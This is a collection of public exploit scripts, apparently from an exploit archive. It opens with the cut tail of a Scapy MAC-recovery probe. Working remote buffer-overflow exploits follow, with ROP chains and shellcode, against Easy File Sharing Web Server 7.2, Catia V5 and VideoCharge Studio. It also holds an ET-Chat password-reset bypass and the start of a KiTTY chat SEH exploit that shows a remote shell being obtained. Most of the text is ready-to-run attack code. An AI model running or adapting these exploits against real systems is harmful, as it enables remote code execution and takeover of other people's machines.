def find_fixed_bits(s, mac):
	# eventually contains the real MAC address
	orgmac = [0] * 6

	# random MAC address, used as sender, to which the target will send an ACK
	srcmac = randmac()

	# for all the bits - FIXME: Don't consider H.O. bit of first MAC byte
	for i in range(6):
		for bit in range(8):
			# flip the bit at current position
			currbit = mac[i] & (1 << bit)
			mac[i] ^= (1 << bit)

			# convert modified mac to string
			strmac = ":".join([format(byte, '02x') for byte in mac])
			print "Probing", strmac, "...",

			replied = False
			for attempt in range(ATTEMPTS_PER_BIT):
				# inject data packet to modified MAC address
				packet = Dot11(type="Data", subtype=4, FCfield="from-DS",
						addr1=strmac, addr2=srcmac, addr3=strmac)
				s.send(RadioTap()/packet)

				# Sniff air for ACK to modified MAC
				l = sniff(lfilter=lambda p: is_ack(p) and p.addr1 == srcmac, count=1,
						timeout=SNIFFTIME, opened_socket=s)

				# We we got an ACK, don't need to try again
				if len(l) == 1:
					replied = True
					break

			print replied

			# If client replied, original bit is different from the one currently set,
			# otherwise it's equal to original bit.
			if replied:
				orgmac[i] |= (~currbit) & (1 << bit)
			else:
				orgmac[i] |= currbit

			# flip bit back to original value
			mac[i] ^= (1 << bit)

	# Done, return original MAC
	return orgmac


if __name__ == "__main__":
	if len(sys.argv) != 3:
		print "Usage:", sys.argv[0], "interface macaddr"
		quit(1)

	try:
		mac = parsemac(sys.argv[2])
		conf.iface = sys.argv[1]

		random.seed()

		# Open up read/write socket so we don't miss the ACK
		L2socket = conf.L2socket
		s = L2socket(type=ETH_P_ALL, iface=conf.iface)

		# Now find the MAC
		orgmac = find_fixed_bits(s, mac)
		s.close()

		print "\nReal MAC address:", ":".join(format(byte, "02x") for byte in orgmac), "\n"
	except ValueError, e:
		print "Invalid MAC address:", e
	except socket.error, e:
		print "Error with provided interface:", e
#!/usr/bin/env python
#
# Exploit title: Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP bypass with ROP)
# Date: 29/11/2015
# Exploit Author: Knaps
# Contact: @TheKnapsy
# Website: http://blog.knapsy.com
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: Easy File Sharing Web Server v7.2
# Tested on: Windows 7 x64, but should work on any other Windows platform
#
# Notes:
# - based on non-DEP SEH buffer overflow exploit by Audit0r (https://www.exploit-db.com/exploits/38526/)
# - created for fun & practice, also because it's not 1998 anymore - gotta bypass that DEP! :)
# - bad chars: '\x00' and '\x3b'
# - max shellcode size allowed: 1260 bytes
#

import sys, socket, struct

# ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy)
# Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP.
def create_rop_chain():

    rop_gadgets = [
	  # Generate value of 201 in EAX
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
	  0xFFFFFDFF,  # Value of '-201'
	  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
	
	  # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
	  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
	  
	  # Carry on with the ROP as generated by mona.py
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
	
	  # Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location
	  # used solely by the remaining part of the above gadget (it doesn't really do anything for us)
	  0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll]
	  0x61c73281,  # &Writable location [sqlite3.dll]
	
	  # And carry on further as generated by mona.py
	  0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll]
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      0x10013ad6,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
	  
	  # Now bunch of ugly increments... unfortunately couldn't find anything nicer :(
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll] 
      0x61c73281,  # &Writable location [sqlite3.dll]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

	
# Check command line args 
if len(sys.argv) <= 1:
    print "Usage: python poc.py [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])


# Offsets
rop_offset = 2455
max_size = 5000
seh_offset = 4059
eax_offset = 4183


# move ESP out of the way so the shellcode doesn't corrupt itself during execution
# metasm > add esp,-1500
shellcode =  "\x81\xc4\x24\xfa\xff\xff"

# Just as a PoC, spawn calc.exe. Replace with any other shellcode you want
# (maximum size of shellcode allowed: 1260 bytes)
#
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x3b' -f python
# Payload size: 220 bytes
shellcode += "\xbb\xde\x37\x73\xe9\xdb\xdf\xd9\x74\x24\xf4\x58\x31"
shellcode += "\xc9\xb1\x31\x31\x58\x13\x83\xe8\xfc\x03\x58\xd1\xd5"
shellcode += "\x86\x15\x05\x9b\x69\xe6\xd5\xfc\xe0\x03\xe4\x3c\x96"
shellcode += "\x40\x56\x8d\xdc\x05\x5a\x66\xb0\xbd\xe9\x0a\x1d\xb1"
shellcode += "\x5a\xa0\x7b\xfc\x5b\x99\xb8\x9f\xdf\xe0\xec\x7f\xde"
shellcode += "\x2a\xe1\x7e\x27\x56\x08\xd2\xf0\x1c\xbf\xc3\x75\x68"
shellcode += "\x7c\x6f\xc5\x7c\x04\x8c\x9d\x7f\x25\x03\x96\xd9\xe5"
shellcode += "\xa5\x7b\x52\xac\xbd\x98\x5f\x66\x35\x6a\x2b\x79\x9f"
shellcode += "\xa3\xd4\xd6\xde\x0c\x27\x26\x26\xaa\xd8\x5d\x5e\xc9"
shellcode += "\x65\x66\xa5\xb0\xb1\xe3\x3e\x12\x31\x53\x9b\xa3\x96"
shellcode += "\x02\x68\xaf\x53\x40\x36\xb3\x62\x85\x4c\xcf\xef\x28"
shellcode += "\x83\x46\xab\x0e\x07\x03\x6f\x2e\x1e\xe9\xde\x4f\x40"
shellcode += "\x52\xbe\xf5\x0a\x7e\xab\x87\x50\x14\x2a\x15\xef\x5a"
shellcode += "\x2c\x25\xf0\xca\x45\x14\x7b\x85\x12\xa9\xae\xe2\xed"
shellcode += "\xe3\xf3\x42\x66\xaa\x61\xd7\xeb\x4d\x5c\x1b\x12\xce"
shellcode += "\x55\xe3\xe1\xce\x1f\xe6\xae\x48\xf3\x9a\xbf\x3c\xf3"
shellcode += "\x09\xbf\x14\x90\xcc\x53\xf4\x79\x6b\xd4\x9f\x85"


buffer = "A" * rop_offset						# padding
buffer += create_rop_chain()
buffer += shellcode
buffer += "A" * (seh_offset - len(buffer))		# padding
buffer += "BBBB"								# overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)			# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))		# padding
buffer += struct.pack("<I", 0xffffffff)			# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))		# padding


httpreq = (
"GET /changeuser.ghp HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host:" + host + ":" + str(port) + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + host + "/\r\n"
"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
"Conection: Keep-Alive\r\n\r\n"
)

# Send payload to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(httpreq)
s.close()
# Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow
# Date: 12/2/2015
# Exploit Author: ArminCyber
# Contact: Armin.Exploit@gmail.com
# Version: 7.2
# Tested on: XP SP3 EN
# category: Remote Exploit
# Usage: ./exploit.py ip port

import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

a = socket.socket()

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port))

entire=4500

# Junk
buff = "A"*4061

# Next SEH
buff+= "\xeb\x0A\x90\x90"

# pop pop ret
buff+= "\x98\x97\x01\x10"

buff+= "\x90"*19

# calc.exe
# Bad Characters: \x20 \x2f \x5c
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)
buff+= shellcode

buff+= "\x90"*7

buff+= "A"*(4500-4061-4-4-20-len(shellcode)-20)

# GET
a.send("GET " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
# Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow
# Date: 12/2/2015
# Exploit Author: ArminCyber
# Contact: Armin.Exploit@gmail.com
# Version: 7.2
# Tested on: XP SP3 EN
# category: Remote Exploit
# Usage: ./exploit.py ip port

import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

a = socket.socket()

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port))

entire=4500

# Junk
buff = "A"*4061

# Next SEH
buff+= "\xeb\x0A\x90\x90"

# pop pop ret
buff+= "\x98\x97\x01\x10"

buff+= "\x90"*19

# calc.exe
# Bad Characters: \x20 \x2f \x5c
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)
buff+= shellcode

buff+= "\x90"*7

buff+= "A"*(4500-4061-4-4-20-len(shellcode)-20)

# HEAD
a.send("HEAD " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
source: http://www.securityfocus.com/bid/65675/info

Catia is prone to a stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary-checks on user-supplied input.

An attacker can exploit this issue to execute arbitrary code in the context of the application. Failed exploit attempts will result in a denial-of-service condition.

Catia V5-6R2013 is vulnerable. 

#!/usr/bin/env python
   
import socket
import struct
import ctypes
 
RetAdd="\x90\x90\x90\x90"
Shell="S" *1000
buff= "\x00\x01\x00\x30" + "A" * 20 + "AppToBusInitMsg" +"\x00" + "\x00" * 48 + "CATV5_Backbone_Bus" +"\x00" + "\x00"* 49 + "\x00\x00\x00\x00"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.3", 55555))
#s.connect(("192.168.0.5", 55558))
s.send(struct.pack('>I',len(buff) ))
s.send(buff)
buff= "\x02\x00\x00\x00" + RetAdd*3 + "\x00\x00\x00\x00" * 13 + "\x00\x00\x00\x00" * 5 + "CATV5_AllApplications" +"\x00" + "\x00"* 43 +"\x00\x00\x98" + "\x00\x00\x00\x01" +"\x00"*4 +"\x08\x00\x00\x00" + Shell                                   
s.send(struct.pack('>I',len(buff) ))
s.send(buff)
source: http://www.securityfocus.com/bid/65685/info

VideoCharge Studio is prone to a remote stack-based buffer-overflow vulnerability because the software fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.

Successful exploits allow remote attackers to execute arbitrary code in the context of the vulnerable application. Failed exploit attempts likely result in denial-of-service conditions.

VideoCharge Studio 2.12.3.685 is vulnerable; other versions may also be affected. 

#!/usr/bin/python
# Exploit Title: VideoCharge Studio v2.12.3.685 cc.dll GetHttpResponse() 
MITM Remote Code Execution Exploit (SafeSEH/ASLR/DEP Bypass)
# Version:       v2.12.3.685
# Date:          2014-02-18
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      http://www.rcesecurity.com
# Software Link: http://www.videocharge.com
# Tested on:     Win7-GER (DEP enabled)
#
# Howto / Notes:
# Since it's a MITM RCE you need to spoof the DNS Record for 
www.videocharge.com in order to successfully exploit this vulnerability
#
 
from socket import *
from struct import pack
from time import sleep
 
host = "192.168.0.1"
port = 80
 
s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port
 
cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
 
# Thanks Giuseppe D'Amore for the amazing shellcode
# http://www.exploit-db.com/exploits/28996/
shellcode = 
("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+
"\x49\x0b\x31\xc0\x51\x50\xff\xd7")
 
junk0 = "\x90" * 1277
junk1 = "\x90" * 1900
nops="\x90" * 30
jmpesp=pack('<L',0x102340e8) * 5 # jmp esp |  {PAGE_EXECUTE_READ} 
[cc.dll]
 
# jump to controlled memory
eip=pack('<L',0x61b84af1) # {pivot 4124 / 0x101c} # ADD ESP,101C # RETN 
[zlib1.dll]
 
#
# ROP registers structure:
# EBP - VirtualProtect() call
# ESP - lpAddress
# EBX - dwSize
# EDX - flNewProtect
# ECX - lpflOldProtect
#
 
# Craft VirtualProtect() call (0x0080D816) via [DE2D66F9 XOR DEADBEEF] 
and MOV to EBP
rop = pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0xDE2D66F9) # XOR param 1
rop += pack('<L',0x10206ac5) # POP EBX # RETN [cc.dll]
rop += pack('<L',0xDEADBEEF) # XOR param 2
rop += pack('<L',0x1002fb27) # XOR EDI,EBX # ADD DL,BYTE PTR DS:[EAX] # 
RETN [cc.dll]
rop += pack('<L',0x101f7572) # MOV EAX,EDI # POP EDI # RETN [cc.dll] 
rop += pack('<L',0xDEADBEEF) # Filler
rop += pack('<L',0x101fbc62) # XCHG EAX,EBP # RETN [cc.dll]
 
# Craft VirtualProtect() dwSize in EAX and MOV to EBX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x101f2adc) # ADD EAX,500 # RETN [cc.dll]
rop += pack('<L',0x1023ccfb) # XCHG EAX,EBX # RETN [cc.dll]
 
# Craft VirtualProtect() flNewProtect in EAX and MOV to EDX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x102026a1) # ADD EAX,25 # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102026b1) # ADD EAX,3 # RETN [cc.dll]
rop += pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b90402) # MOV EDX,ECX # RETN [zlib1.dll]
 
# Put writable offset for VirtualProtect() lpflOldProtect to ECX
rop += pack('<L',0x1020aacf) # POP ECX # RETN [cc.dll]
rop += pack('<L',0x61B96180) # writable location [zlib1.dll]
 
# POP a value from the stack after PUSHAD and POP value to ESI
# as a preparation for the VirtualProtect() call
rop += pack('<L',0x61b850a4) # POP ESI # RETN [zlib1.dll]
rop += pack('<L',0x61B96180) # writable location from [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
 
# Achievement unlocked: PUSHAD
rop += pack('<L',0x101e93d6) # PUSHAD # RETN [cc.dll]
rop += pack('<L',0x102340c5) # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]
 
payload = junk0 + eip + junk1 + rop + jmpesp + nops + shellcode
 
buffer = "HTTP/1.1 200 OK\r\n"
buffer += "Date: Sat, 09 Feb 2014 13:33:37 GMT\r\n"
buffer += "Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with 
Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n"
buffer += "X-Powered-By: PHP/5.2.6-1+lenny16\r\n"
buffer += "Vary: Accept-Encoding\r\n"
buffer += "Content-Length: 4000\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: text/html\r\n\r\n"
buffer += payload
buffer += "\r\n"
 
print cl.recv(1000)
 
cl.send(buffer)
 
print "[+] Sending exploit: OK\n"
 
sleep(3)
cl.close()
s.close()
source: http://www.securityfocus.com/bid/66149/info

ET - Chat is prone to a security bypass vulnerability.

An attacker can exploit this issue to bypass certain security restrictions and perform unauthorized actions; this may aid in launching further attacks.

ET - Chat 3.0.7 is vulnerable; other versions may also be affected.

#!/usr/bin/env python
__author__ = 'IRH'
print "Example: et-chat.py http://et-chat.com/chat"

import urllib
import sys

url = sys.argv[1]
url1 = url+"/?InstallIndex"
url2 = url+"/?InstallMake"

checkurl = urllib.urlopen(url1)

if checkurl.code == 200 :
    urllib.urlopen(url2)
    print "Password Was Reseted!! Enjoy ;)"
else:
    print "Site is not Vulnerability"
# Exploit Title: KiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)
# Date: 28/12/2015
# Exploit Author: Guillaume Kaddouch
#   Twitter: @gkweb76
#   Blog: http://networkfilter.blogspot.com
#   GitHub: https://github.com/gkweb76/exploits
# Vendor Homepage: http://www.9bis.net/kitty/
# Software Link: http://sourceforge.net/projects/portableapps/files/KiTTY%20Portable/KiTTYPortable_0.65.0.2_English.paf.exe
# Version: 0.65.0.2p
# Tested on: Windows XP SP3 x86 (FR), Windows 7 Pro x64 (FR), Windows 10 Pro x64 builds 10240/10586 (FR)
# CVE: CVE-2015-7874
# Category: Remote

"""
Disclosure Timeline:
--------------------
2015-09-13: Vulnerability discovered
2015-09-26: Vendor contacted
2015-09-28: Vendor answer
2015-10-09: KiTTY 0.65.0.3p released : unintentionally (vendor said) preventing exploit from working, without fixing the core vulnerability
2015-12-28: exploit published

Other KiTTY versions have been released since 0.65.0.3p, not related to this vulnerability. Vendor said he may release a version without chat in a future release,
while providing an external chat DLL as a separate download.

Description :
-------------
A remote overflow exists in the KiTTY Chat feature, which enables a remote attacker to execute code on the
vulnerable system with the rights of the current user, from Windows XP x86 to Windows 10 x64 included (builds 10240/10586).
Chat feature is not enabled by default.

WinXP -> Remote Code Execution
Win7  -> Remote Code Execution
Win10 -> Remote Code Execution

Instructions:
-------------
- Enable Chat feature in KiTTY portable (add "Chat=1" in kitty.ini)
- Start KiTTY on 127.0.0.1 port 1987 (Telnet)
- Run exploit from remote machine (Kali Linux is fine)

Exploitation:
-------------
When sending a long string to the KiTTY chat server as nickname, a crash occurs. The EIP overwrite does let little room
for exploitation (offset 54) with no more than 160 to 196 bytes for the shellcode from XP to Windows10. Using a Metasploit 
small shellcode such as windows/shell/reverse_ord_tcp (118 bytes encoded) makes KiTTY crashing after the first connection. 
We control the SEH overflow, but as all DLLs are SafeSEH protected, using an address from KiTTY itself has a NULL which 
forces us to jump backward with no extra space. We are jailed in a tight environment with little room to work with.

The trick here is to slice our wanted Metasploit bind shellcode in 3 parts (350 bytes total), and send them in 3 
successive buffers, each of them waiting in an infinite loop to not crash the process. Each buffer payload will copy 
its shellcode slice to a stable memory location which has enough room to place a bigger shellcode. The final buffer  
jumps to that destination memory location where our whole shellcode has been merged, to then proceed with decoding 
and execution. This exploit is generic, which means you can even swap the shellcode included with a 850 bytes one, 
and it will be sliced in as many buffers as necessary. This method should theoretically be usable for other 
exploits and vulnerabilities as well.

All KiTTY versions prior to 0.65.0.2p should be vulnerable, the only change is the SEH address for the POP POP RET. 
I have successfully exploited prior versions 0.63.2.2p and 0.62.1.2p using SEH addresses I have included as comment in the exploit.

Pro & Cons:
-----------
[+]: works from XP to Windows 10 as it uses addresses from the main executable
[+]: not affected by system DEP/ASLR/SafeSEH as the main executable is not protected
[+]: works even with small slice size below 50 bytes, instead of 118
[-]: each buffer sent consumes 100% of one CPU core. Sending many buffers can reach 100% of whole CPU depending on the 
CPU's core number. However even on a single core CPU, it is possible to send 9 buffers and run a shellcode successfully.
Also, for a bind shell payload, the connection is kept open even when closing the main program.
[-]: the destination memory address is derived from address of ECX at time of crash. To reuse this slice method on another 
vulnerability, it may be required to use another register, or even to use addresses available on stack instead at time of crash.

Graphical explanation:
---------------------

-------------------
-------------------
---- SHELLCODE ----
-------------------
-------------------

1) Shellcode Slicer -> slice[1]
					-> slice[2]
					-> slice[3]

2) Buffer Builder	-> buffer[1]: junk + padding + slice[1] + endmark + shell_copy + nseh + seh
					-> buffer[2]: junk + padding + slice[2] + endmark + shell_copy + nseh + seh
					-> buffer[3]: junk + padding + slice[3] + endmark + shell_copy + nseh + seh

															       TARGET CRASH AREA			    TARGET DST ADDR
																-----------------------	 shell_copy --------------
3) Slice Launcher	-> Sends buffer[1] ------------------------>| buffer[1] (thread1) |   ----->    |  slice[1]  | <-| 
					-> Sends buffer[2] ------------------------>| buffer[2] (thread2) |   ----->    |  slice[2]  |	 |
					-> Sends buffer[3] ------------------------>| buffer[3] (thread3) |   ----->    |  slice[3]  |   |
																-----------------------				--------------	 |
																				|									 |
																				|____________________________________|
																						jump to rebuilt shellcode

guillaume@kali64:~$ ./kitty_chat.py 10.0.0.52 win10

KiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)
[*] Connecting to 10.0.0.52
[*] Sending evil buffer1... (slice 1/3)
[*] Sending evil buffer2... (slice 2/3)
[*] Sending evil buffer3... (slice 3/3)

[*] Connecting to our shell...
(UNKNOWN) [10.0.0.52] 4444 (?) open
Microsoft Windows [version 10.0.10240]
(c) 2015 Microsoft Corporation. Tous droits reserves.

C:\kitty\App\KiTTY>

"""

import socket, os, time, sys, struct

print "\nKiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)"

if len(sys.argv) < 3:
        print "\nUsage: kitty_chat.py <IP> <winxp|win7|win10> [no_nc|local_nc]"
        print "Example: kitty_chat.py 192.168.135.130 win7"
        print "\n Optional argument:"
        print "- 'no_nc' (no netcat), prevents the exploit from starting netcat."
        print "Useful if you are using your own shellcode."
        print "- 'local_nc (local netcat), binds netcat on local port 4444."
        print "Useful if you are using a classic reverse shell shellcode."
        sys.exit()

host = sys.argv[1] # Remote target
win  = sys.argv[2] # OS

# If argument "no_nc" specified, do not start netcat at the end of the exploit
# If argument "local_nc" specified, bind netcat to local port 4444
# By default netcat will connect to remote host on port 4444 (default shellcode is a bind shell)
netcat = "remote"
if len(sys.argv) == 4:
        if   sys.argv[3] == "no_nc":
                netcat = "disabled"
